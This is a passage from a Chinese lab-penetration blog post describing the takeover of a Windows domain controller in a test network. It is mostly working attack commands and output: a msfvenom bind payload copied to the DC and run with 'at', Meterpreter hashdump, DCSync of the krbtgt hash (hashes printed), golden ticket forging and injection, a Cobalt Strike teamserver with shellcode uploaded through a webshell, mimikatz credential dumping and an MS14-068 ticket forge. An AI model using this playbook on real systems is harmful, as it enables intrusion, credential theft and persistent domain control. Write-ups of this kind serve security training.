+<h3 id="5-1-14-获取-dc-域控权限"><a href="#5-1-14-获取-dc-域控权限" class="headerlink" title="5.1.14. 获取 dc 域控权限"></a>5.1.14. 获取 dc 域控权限</h3><h4 id="5-1-14-1-生成正向载荷"><a href="#5-1-14-1-生成正向载荷" class="headerlink" title="5.1.14.1. 生成正向载荷"></a>5.1.14.1. 生成正向载荷</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp lport=13777 -f exe &gt;`<span class="built_in">pwd</span>`/bind.exe</span><br></pre></td></tr></table></figure>
+<h4 id="5-1-14-2-copy-复制到域控"><a href="#5-1-14-2-copy-复制到域控" class="headerlink" title="5.1.14.2. copy 复制到域控"></a>5.1.14.2. copy 复制到域控</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\phpstudy_pro\WWW\www.webhack123.com&gt;copy bind.exe \\dc\C$\ copy bind.exe \\dc\C$\ </span><br></pre></td></tr></table></figure>
+<h4 id="5-1-14-3-at-执行任务运行-exe"><a href="#5-1-14-3-at-执行任务运行-exe" class="headerlink" title="5.1.14.3. at 执行任务运行 exe"></a>5.1.14.3. at 执行任务运行 exe</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\system32&gt;at \\dc 0:27:00 c:/bind.exe</span><br><span class="line">at \\dc 0:27:00 c:/bind.exe</span><br></pre></td></tr></table></figure>
+<p><img src="EqsLbDehJeczCRv-cDhDcRHg9w9lPoGOjeYla4aqwO4.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 10.10.10.149</span><br><span class="line"><span class="built_in">set</span> lport 13777</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p><img src="DuFNjezYzFUr46HtyOrGONZI9aOfF8dUM7TnTmqACx8.png" alt="image"></p>
+<h3 id="5-1-15获取-dc-域控哈希明文"><a href="#5-1-15获取-dc-域控哈希明文" class="headerlink" title="5.1.15获取 dc 域控哈希明文"></a>5.1.15获取 dc 域控哈希明文</h3><p>进程迁移</p>
+<p><img src="u0o8-m-V0ej8DN56676H3_mV04yZ57kNpeVDjdJ83cE.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run hashdump</span><br></pre></td></tr></table></figure>
+<p><img src="MBSM42CqWl-xFyGjZlAJcinJ8ikEwd14i7cRPpcFHUU.png" alt="image"></p>
+<h3 id="5-1-16-抓域控全部-hash"><a href="#5-1-16-抓域控全部-hash" class="headerlink" title="5.1.16. 抓域控全部 hash"></a>5.1.16. 抓域控全部 hash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+<p><img src="NMqzFe5L9OOVq9C9rfBEZAVzv279q3T4-jkKCTdj0s0.png" alt="image"></p>
+<h3 id="5-1-17制作黄金票据"><a href="#5-1-17制作黄金票据" class="headerlink" title="5.1.17制作黄金票据"></a>5.1.17制作黄金票据</h3><p>考虑长期权维护，还是做一个黄金票据比较保险。</p>
+<p> </p>
+<h3 id="5-1-18获取-ntml-sid-rid"><a href="#5-1-18获取-ntml-sid-rid" class="headerlink" title="5.1.18获取 ntml sid rid"></a>5.1.18获取 ntml sid rid</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount <span class="built_in">where</span> name=<span class="string">&quot;krbtgt&quot;</span> get sid</span><br><span class="line">S-1-5-21-2005268815-658469957-1189185684-502</span><br></pre></td></tr></table></figure>
+<p><img src="62iCaNpvd2-OA1TpN-5xs69bnwYZX5ycdXbx2smZ-UM.png" alt="image"></p>
+<h3 id="5-1-19窃取-域控超级管理权限"><a href="#5-1-19窃取-域控超级管理权限" class="headerlink" title="5.1.19窃取 域控超级管理权限"></a>5.1.19窃取 域控超级管理权限</h3><p>系统权限没办法做dcsync 所以切换域管理权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steal_token 2264</span><br><span class="line">dcsync_ntlm krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="8NN4jFntUF57QFH2dcJ4Ew3y1p0X3WVedFR5OmdTxTE.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Account   : krbtgt</span><br><span class="line">[+] NTLM Hash : 6f60ace6accbcb76078ccc0312174e98</span><br><span class="line">[+] LM Hash   : 36588bd35fd1fe85ec5fd73a1ca6805b</span><br><span class="line">[+] SID       : S-1-5-21-2005268815-658469957-1189185684-502</span><br><span class="line">[+] RID       : 502</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="5-1-20生成黄金票据"><a href="#5-1-20生成黄金票据" class="headerlink" title="5.1.20生成黄金票据"></a>5.1.20生成黄金票据</h3><p>golden_ticket_create -d &lt;域名&gt; -u &lt;任意用户名&gt; -s <Domain sid> -k <krbtgt ntlm hash> -t &lt;ticket 本地存储路径如:&#x2F;tmp&#x2F;krbtgt.ticket&gt;</krbtgt></Domain></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">golden_ticket_create -d hackbox.com -u garck -s S-1-5-21-2005268815-658469957-1189185684 -k 6f60ace6accbcb76078ccc0312174e98 -t /tmp/krbtgt.ticket</span><br></pre></td></tr></table></figure>
+<p><img src="zFGUuFg7HaT8xvyiqgzxpkgr3KvvPXgoZeHbRck0b_c.png" alt="image"></p>
+<h3 id="5-1-21-注入黄金票据"><a href="#5-1-21-注入黄金票据" class="headerlink" title="5.1.21. 注入黄金票据"></a>5.1.21. 注入黄金票据</h3><p>切换到 web 服务器 把凭据都清理掉</p>
+<p>load kiwi</p>
+<p>kerberos_ticket_purge</p>
+<p><img src="frsYIOclYsljOKQ_NL_Urpl9gGH4Za9q4pO3o6nav6w.png" alt="image"></p>
+<p>注入黄金票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_use /tmp/krbtgt.ticket </span><br><span class="line"><span class="built_in">dir</span> \\dc\c$</span><br></pre></td></tr></table></figure>
+<p><img src="SdA2-1uR6_vOkisvDPJAgF4MiXp6UUrNErRbcVpUugA.png" alt="image"></p>
+<p> </p>
+<p> </p>
+<h2 id="5-2cobaltstrike-进行内网域渗透"><a href="#5-2cobaltstrike-进行内网域渗透" class="headerlink" title="5.2cobaltstrike 进行内网域渗透"></a>5.2cobaltstrike 进行内网域渗透</h2><h3 id="5-2-1-建立-teamserver"><a href="#5-2-1-建立-teamserver" class="headerlink" title="5.2.1.建立 teamserver"></a>5.2.1.建立 teamserver</h3><p>.&#x2F;teamserver 192.168.8133 4477</p>
+<p>设置好监听器，密码是garck</p>
+<p><img src="u-Q8q58BpsZjSI0ROkj8XX9u7X3EMkpgV0W71710qG4.png" alt="image"></p>
+<p>在windows打开start.bat</p>
+<p><img src="R9iahA4Tb3atyzJEdPMNuF-OX-o6wT3jR-HvgOJ_DLE.png" alt="image"></p>
+<p>连接上之后，查看监听器。全选之后进行删除。</p>
+<p><img src="aKF8Q4X85DoVqaqTsCbX-8jEw3D2AulOZMKKzSbu2yU.png" alt="image"></p>
+<p>添加</p>
+<p><img src="G6skbVa1ApWCy_7vB9mRMnNCE1ZwTyvOf2F-er4ujvM.png" alt="image"></p>
+<p><img src="5r0rzTaria0jasqvwxy98GPNhai5EaaCo_NZgR6l3vE.png" alt="image"></p>
+<p>添加监听</p>
+<p><img src="yGzdl7I6VR9qBm7owT2KpBr6kgdnN1ZPaT705uW7eFU.png" alt="image"></p>
+<p>生成shellcode</p>
+<p><img src="T2nM21iTAMSIbCZLTeX4fzOC1MVev41QMFXqXt-R94k.png" alt="image"></p>
+<p><img src="MxJikiQrkwhKLqIMWvaFK00M4MhLbDc_ce9cUl4KOtk.png" alt="image"></p>
+<p>保存之后，使用菜刀进行上传至目标服务器。</p>
+<p>执行之后，设置时间为0秒</p>
+<p><img src="yKcsK5s97h1tnWenrQj_LerdmVCsBvSZy_hkKXdKOQU.png" alt="image"></p>
+<p><img src="KV3dgaTfC0rmzdw8ZKPrHzRggGtQ3ZW0gHPgMN_nV08.png" alt="image"></p>
+<p><img src="rFU-eUopnDduTOzor2Ig-aW-80OOA6krqGYQbSw999M.png" alt="image"></p>
+<p>查看</p>
+<p><img src="BZm0L6WL4kMgCdgcyBBgVhaE8JzZYWkyVnkoR4ngm1I.png" alt="image"></p>
+<p>获取目标信任主机</p>
+<p><img src="79F5Fj4hzWBkyB5WpRuXQE7lJAON0qePnvytxhzxWsE.png" alt="image"></p>
+<p> cobaltstrike mimikatz web 服务获取明密文</p>
+<p><img src="mA0wDxcU4g9fbpWd3y125Ku0uzn3uOxa399_fJXbNvA.png" alt="image"></p>
+<p> 查看明文</p>
+<p><img src="XhKg3MXmMCuj1MzJxUj2idVo80MeUQog61MFOyVsdHg.png" alt="image"></p>
+<p> dir访问域控DC</p>
+<p><img src="VQ3s7r-SOQb2iLfD4brj9RTvSgV2cWGQgJyZeJknqPQ.png" alt="image"></p>
+<p>在 py 脚本下创建票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/webhack123/pykek<span class="comment"># set +H</span></span><br><span class="line">root@kali:/Desktop/webhack123/pykek<span class="comment"># proxychains python ms14-068.py -u web@hackbox.com -s S-1-5-21-2005268815-658469957-1189185684-1103 -d 10.10.10.149 -p !@#Qwe45</span></span><br></pre></td></tr></table></figure>
+<p><img src="IhiC0Zp6jOCjmKTo6cTmvMD4rnE-gVfd39yjTfXQeTg.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KrbCredExport 将 .ccache 文件转化为 kirbi 格式</span><br></pre></td></tr></table></figure>
+<p><img src="9AT_1I_2qT6nKyblCU-EpBMjgKfvcDVgJpdj9cFfDKE.png" alt="image"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">导入票据访问 dc</span><br><span class="line">导入票据 </span><br><span class="line">kerberos_ticket_use C:\user.ticket</span><br></pre></td></tr></table></figure>
+<p><img src="nZW70taEOK9-l4__g3sIl4xiXvs6r0NlAd5xU8YQz9A.png" alt="image"></p>
+<p>获取 dc 域控权限 </p>
+<p>现在只有访问 dc 域控的权限，接下来是 dc 域控的控制</p>
+<p> 设置 smb 连接器</p>
+<p><img src="3wEcr-sKIX8RWzRw_PSh_dLR6HltQNXLoglXL2Sr5ZE.png" alt="image"></p>
+<p>生成后门文件 选择 smb 因为是正向连接 如果使用反向链接 需要做转发 比较麻烦</p>
+<p><img src="LFSYccUwPXtUVA3GeJ2Gp-gfGE-T3_5be21q25c8LNE.png" alt="image"></p>
+<p>复制文件到 dc 域控并运行</p>
+<p><img src="oWN7ziYXSnOwmxX08zYI0k8pmtmmfwC2ianXvAUxF94.png" alt="image"></p>
+<p>在 beacon 正向连接上 dc </p>
+<p>link dc</p>
+<p><img src="b2AdoNhpPRREAnlU-u2HrgHlXIvyXAbUbmfE5p-UvzU.png" alt="image"></p>
+<p>获取 dc 明文哈希 </p>
+<p>命令输入 mimikatz hashdum</p>
+<p><img src="qYnk7cdpbpflPo5Hxcn5poGzbM1IA7m_UxSVF8LFCDI.png" alt="image"></p>
+<p><img src="Lg-KTweC8rhCZG9AZKRtDzqQ5wqli1nibNrNwJtPUMo.png" alt="image"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">文章</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text">打靶日记（三）完整的内网域渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">1.环境介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1%E7%8E%AF%E5%A2%83%E5%9B%BE"><span class="toc-number">2.1.</span> <span class="toc-text">1.1环境图</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">2.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1masscan-%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">3.1.</span> <span class="toc-text">2.1masscan 端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3nmap-%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%AB%AF%E5%8F%A3%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">3.2.</span> <span class="toc-text">2.3nmap 获取系统和端口版本信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%AF%B9%E7%BD%91%E7%AB%99%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">3.对网站进行安全检测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E7%BB%91%E5%AE%9A-hosts"><span class="toc-number">4.1.</span> <span class="toc-text">3.1.绑定 hosts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2gobuster-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F"><span class="toc-number">4.2.</span> <span class="toc-text">3.2gobuster 目录文件扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-svn-%E9%81%8D%E5%8E%86%E6%BA%90%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.3.</span> <span class="toc-text">3.3 .svn 遍历源代码漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4wc-db-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">4.4.</span> <span class="toc-text">3.4wc.db 文件下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5thinkphp-%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">4.5.</span> <span class="toc-text">3.5thinkphp 日志文件泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6python-%E7%BC%96%E5%86%99%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-number">4.6.</span> <span class="toc-text">3.6python 编写日志文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-7%E5%8F%91%E7%8E%B0%E7%AE%A1%E7%90%86%E5%AF%86%E6%96%87"><span class="toc-number">4.7.</span> <span class="toc-text">3.7发现管理密文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-8%E7%BB%91%E5%AE%9A-hosts-%E7%A2%B0%E6%92%9E%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-number">4.8.</span> <span class="toc-text">3.8绑定 hosts 碰撞管理后台子域名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-9%E5%90%8E%E5%8F%B0%E9%AA%8C%E8%AF%81%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.9.</span> <span class="toc-text">3.9后台验证码逻辑漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-10-%E8%AE%BE%E7%BD%AE%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%8B%BF-webshell"><span class="toc-number">4.10.</span> <span class="toc-text">3.10. 设置上传文件类型拿 webshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4metasploit-%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83%E5%92%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.</span> <span class="toc-text">4metasploit 进行提权和信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E7%94%9F%E6%88%90%E6%94%BB%E5%87%BB%E8%BD%BD%E8%8D%B7"><span class="toc-number">5.1.</span> <span class="toc-text">4.1.生成攻击载荷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2%E7%9B%91%E5%90%AC%E4%B8%8A%E7%BA%BF"><span class="toc-number">5.2.</span> <span class="toc-text">4.2监听上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-3migrate-%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B"><span class="toc-number">5.3.</span> <span class="toc-text">4.3migrate 迁移进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-4-mimikatz-%E5%93%88%E5%B8%8C%E6%98%8E%E6%96%87%E8%8E%B7%E5%8F%96"><span class="toc-number">5.4.</span> <span class="toc-text">4.4.mimikatz 哈希明文获取</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E8%B7%A8%E7%BD%91%E6%AE%B5%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">6.</span> <span class="toc-text">5.跨网段域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-metasploit-%E8%B7%A8%E7%BD%91%E6%AE%B5%E7%9A%84%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">6.1.</span> <span class="toc-text">5.1.metasploit 跨网段的域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-1%E7%A1%AE%E5%AE%9A%E5%9F%9F%E7%8E%AF%E5%A2%83"><span class="toc-number">6.1.1.</span> <span class="toc-text">5.1.1确定域环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-2%E5%AE%9A%E4%BD%8D%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.1.2.</span> <span class="toc-text">5.1.2定位域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-3%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">6.1.3.</span> <span class="toc-text">5.1.3域信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-4%E7%BB%88%E7%AB%AF%E8%AE%BE%E7%BD%AE%E4%B9%B1%E7%A0%81"><span class="toc-number">6.1.4.</span> <span class="toc-text">5.1.4终端设置乱码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-5%E7%BB%88%E7%AB%AF%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4"><span class="toc-number">6.1.5.</span> <span class="toc-text">5.1.5终端执行命令信息收集命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-6%E8%8E%B7%E5%8F%96%E7%99%BB%E5%BD%95%E8%BF%87%E7%9A%84%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">6.1.6.</span> <span class="toc-text">5.1.6获取登录过的用户信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-7%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1%E6%B8%97%E9%80%8F-DC-%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.1.7.</span> <span class="toc-text">5.1.7添加路由渗透 DC 域控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-8%E5%BC%80%E5%90%AF%E4%BB%A3%E7%90%86"><span class="toc-number">6.1.8.</span> <span class="toc-text">5.1.8开启代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-9-%E8%AE%BE%E7%BD%AE-porychanins-%E4%BB%A3%E7%90%86-nmap-%E6%89%AB%E6%8F%8F"><span class="toc-number">6.1.9.</span> <span class="toc-text">5.1.9.设置 porychanins 代理 nmap 扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-10%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D-ms17-010-%E8%BF%9B%E8%A1%8C%E6%BA%A2%E5%87%BA"><span class="toc-number">6.1.10.</span> <span class="toc-text">5.1.10永恒之蓝 ms17_010 进行溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-11ms14-068-%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">6.1.11.</span> <span class="toc-text">5.1.11ms14-068 的条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-12%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2"><span class="toc-number">6.1.12.</span> <span class="toc-text">5.1.12开启远程桌面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-13ms14-068-%E6%8F%90%E6%9D%83%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.1.13.</span> <span class="toc-text">5.1.13ms14-068 提权域控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-13-1-ms14-068-exe-%E5%88%9B%E5%BB%BA%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.13.1.</span> <span class="toc-text">5.1.13.1. ms14-068.exe 创建票据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-13-2%E8%BD%BD%E5%85%A5-kiwi"><span class="toc-number">6.1.13.2.</span> <span class="toc-text">5.1.13.2载入 kiwi</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-13-3%E6%B8%85%E7%90%86%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.13.3.</span> <span class="toc-text">5.1.13.3清理票据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-14-%E8%8E%B7%E5%8F%96-dc-%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90"><span class="toc-number">6.1.14.</span> <span class="toc-text">5.1.14. 获取 dc 域控权限</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-14-1-%E7%94%9F%E6%88%90%E6%AD%A3%E5%90%91%E8%BD%BD%E8%8D%B7"><span class="toc-number">6.1.14.1.</span> <span class="toc-text">5.1.14.1. 生成正向载荷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-14-2-copy-%E5%A4%8D%E5%88%B6%E5%88%B0%E5%9F%9F%E6%8E%A7"><span class="toc-number">6.1.14.2.</span> <span class="toc-text">5.1.14.2. copy 复制到域控</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-1-14-3-at-%E6%89%A7%E8%A1%8C%E4%BB%BB%E5%8A%A1%E8%BF%90%E8%A1%8C-exe"><span class="toc-number">6.1.14.3.</span> <span class="toc-text">5.1.14.3. at 执行任务运行 exe</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-15%E8%8E%B7%E5%8F%96-dc-%E5%9F%9F%E6%8E%A7%E5%93%88%E5%B8%8C%E6%98%8E%E6%96%87"><span class="toc-number">6.1.15.</span> <span class="toc-text">5.1.15获取 dc 域控哈希明文</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-16-%E6%8A%93%E5%9F%9F%E6%8E%A7%E5%85%A8%E9%83%A8-hash"><span class="toc-number">6.1.16.</span> <span class="toc-text">5.1.16. 抓域控全部 hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-17%E5%88%B6%E4%BD%9C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.17.</span> <span class="toc-text">5.1.17制作黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-18%E8%8E%B7%E5%8F%96-ntml-sid-rid"><span class="toc-number">6.1.18.</span> <span class="toc-text">5.1.18获取 ntml sid rid</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-19%E7%AA%83%E5%8F%96-%E5%9F%9F%E6%8E%A7%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E6%9D%83%E9%99%90"><span class="toc-number">6.1.19.</span> <span class="toc-text">5.1.19窃取 域控超级管理权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-20%E7%94%9F%E6%88%90%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.20.</span> <span class="toc-text">5.1.20生成黄金票据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-21-%E6%B3%A8%E5%85%A5%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.21.</span> <span class="toc-text">5.1.21. 注入黄金票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2cobaltstrike-%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F"><span class="toc-number">6.2.</span> <span class="toc-text">5.2cobaltstrike 进行内网域渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-1-%E5%BB%BA%E7%AB%8B-teamserver"><span class="toc-number">6.2.1.</span> <span class="toc-text">5.2.1.建立 teamserver</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&text=打靶日记（三）完整的内网域渗透"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&title=打靶日记（三）完整的内网域渗透"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/&is_video=false&description=打靶日记（三）完整的内网域渗透"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=打靶日记（三）完整的内网域渗透&body=Check out this article: https://garckz.github.io/2021/11/14/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%B8%89%EF%BC%89%E5%AE%8C%E6%95%B4%E7%9A%84%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
